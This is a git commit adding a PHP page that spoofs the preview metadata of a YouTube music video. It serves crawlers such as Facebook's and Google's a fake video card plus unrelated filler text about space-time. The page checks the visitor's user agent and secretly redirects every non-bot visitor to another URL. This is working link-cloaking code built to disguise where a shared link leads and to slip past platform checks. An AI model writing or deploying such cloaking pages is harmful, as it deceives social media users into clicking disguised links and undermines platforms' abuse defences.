6404d1778848fa8319b966be2032601737e430c4
Sinhalen Network <38124764+sinhalen@users.noreply.github.com>
2019-05-13 23:48:40 +0530

    Add files via upload

---
+++ apede.php
@@ -0,0 +1,81 @@
+<html>
+<head>
+         <!-- OG Tags -->
+
+<meta name="title" content="Taylor Swift - …Ready For It?" />
+<meta name="description" content="Shop music here: http://smarturl.it/TASmusic Shop merchandise here: http://taylor.lk/tourmerch Follow Taylor Swift Online Instagram: http://www.instagram.com..." />
+<meta name="keywords" content="Taylor Swift, …Ready For It?, reputation" />
+<meta name="theme-color" content="#ff0000" />
+<meta property="og:site_name" content="YouTube" />
+<meta property="og:url" content="https://www.youtube.com/watch?v=wIft-t-MQuE" />
+<meta property="og:title" content="Taylor Swift - …Ready For It?" />
+<meta property="og:image" content="https://i.ytimg.com/vi/wIft-t-MQuE/maxresdefault.jpg" />
+<meta property="og:description" content="Shop music here: http://smarturl.it/TASmusic Shop merchandise here: http://taylor.lk/tourmerch Follow Taylor Swift Online Instagram: http://www.instagram.com..." />
+<meta property="al:ios:app_store_id" content="544007664" />
+<meta property="al:ios:app_name" content="YouTube" />
+<meta property="al:ios:url" content="vnd.youtube://www.youtube.com/watch?v=wIft-t-MQuE&feature=applinks" />
+<meta property="al:android:url" content="vnd.youtube://www.youtube.com/watch?v=wIft-t-MQuE&feature=applinks" />
+<meta property="al:android:app_name" content="YouTube" />
+<meta property="al:android:package" content="com.google.android.youtube" />
+<meta property="al:web:url" content="https://www.youtube.com/watch?v=wIft-t-MQuE&feature=applinks" />
+<meta property="og:type" content="video.other" />
+<meta property="og:video:url" content="https://www.youtube.com/embed/wIft-t-MQuE" />
+<meta property="og:video:secure_url" content="https://www.youtube.com/embed/wIft-t-MQuE" />
+<meta property="og:video:type" content="text/html" />
+<meta property="og:video:width" content="1280" />
+<meta property="og:video:height" content="720" />
+<meta property="og:video:url" content="http://www.youtube.com/v/wIft-t-MQuE?version=3&autohide=1" />
+<meta property="og:video:secure_url" content="https://www.youtube.com/v/wIft-t-MQuE?version=3&autohide=1" />
+<meta property="og:video:type" content="application/x-shockwave-flash" />
+<meta property="og:video:width" content="1280" />
+<meta property="og:video:height" content="720" />
+<meta property="og:video:tag" content="Taylor Swift" />
+<meta property="og:video:tag" content="…Ready For It?" />
+<meta property="og:video:tag" content="reputation" />
+<meta property="fb:app_id" content="87741124305" />
+<meta name="twitter:card" content="player" />
+<meta name="twitter:site" content="@youtube" />
+<meta name="twitter:url" content="https://www.youtube.com/watch?v=wIft-t-MQuE" />
+<meta name="twitter:title" content="Taylor Swift - …Ready For It?" />
+<meta name="twitter:description" content="Shop music here: http://smarturl.it/TASmusic Shop merchandise here: http://taylor.lk/tourmerch Follow Taylor Swift Online Instagram: http://www.instagram.com..." />
+<meta name="twitter:image" content="https://i.ytimg.com/vi/wIft-t-MQuE/maxresdefault.jpg" />
+<meta name="twitter:app:name:iphone" content="YouTube" />
+<meta name="twitter:app:id:iphone" content="544007664" />
+<meta name="twitter:app:name:ipad" content="YouTube" />
+<meta name="twitter:app:id:ipad" content="544007664" />
+<meta name="twitter:app:url:iphone" content="vnd.youtube://www.youtube.com/watch?v=wIft-t-MQuE&feature=applinks" />
+<meta name="twitter:app:url:ipad" content="vnd.youtube://www.youtube.com/watch?v=wIft-t-MQuE&feature=applinks" />
+<meta name="twitter:app:name:googleplay" content="YouTube" />
+<meta name="twitter:app:id:googleplay" content="com.google.android.youtube" />
+<meta name="twitter:app:url:googleplay" content="https://www.youtube.com/watch?v=wIft-t-MQuE" />
+<meta name="twitter:player" content="https://www.youtube.com/embed/wIft-t-MQuE" />
+<meta name="twitter:player:width" content="1280" />
+<meta name="twitter:player:height" content="720" />
+
+
+	<meta http-equiv="Content-Type" content="text/html;charset=utf-8">
+	<script src="//ajax.googleapis.com/ajax/libs/jquery/1.10.2/jquery.min.js"></script>  
+</head>
+
+Like an explorer who has arrived in a mythical land, this compound term shimmers before our eyes as a master key to unlock relativity, to touch the outposts of a terra incognita – cosmology. But what exactly does the concept of space-time represent?During the time of Newton and the discovery of experimentation, the universe was eternal and ageless. Time was an independent variable whose course could not be altered. Scientists could understand space, measure distances, weigh masses, and calculate elapsed time. They assessed absolute events.By “inventing” gravitation, Newton created a universal law that applied everywhere and at all times. It is a dynamic and reversible law. There is no difference between a film of a planet moving forward and the same movement filmed in reverse. The two phenomena are equivalent.Aware of some anomalies in classical theories, Einstein integrated this law into his theory of relativity in 1905. Einstein’s equations describe a universe where space is linked to time, which Minkowski called the “space-time continuum”. Einstein also postulated the existence of a speed limit in a vacuum, i.e. the speed of light. At the same time, the French writer Gaston de Pawlowski was writing his novel “Voyage to the Land of the Fourth Dimension”, the precursor to a theme which has since become a classic.Diagram summarizing the topology of an isolated relativistic event and its components in a universe with zero curvature (flat). Einstein’s unified field equations make it possible to establish the equivalence of spacetime and matter, which is the four-vector or stress-energy tensor.Two centuries earlier, Newton had already shown that the universe contained 4 dimensions, but he had not established the link between space and time. Newton’s law allowed gravity to act instantly at a distance, an astonishing property which he initially judged to be divine in nature, but a few years later he had to admit that it was “absurd” without the mediation of a physical medium.
+
+<body>
+
+<?php
+function bot_detected() {
+  return (
+    isset($_SERVER['HTTP_USER_AGENT'])
+    && preg_match('/bot|crawl|GoogleBot|facebookexternalhit/1.1|mediapartners/i', $_SERVER['HTTP_USER_AGENT'])
+  );
+}
+
+if (bot_detected()===false) {
+echo '<script type="text/javascript">
+           window.location = "http://www.google.com/"
+      </script>';
+}
+?>
+
+
+</body>
+</html>
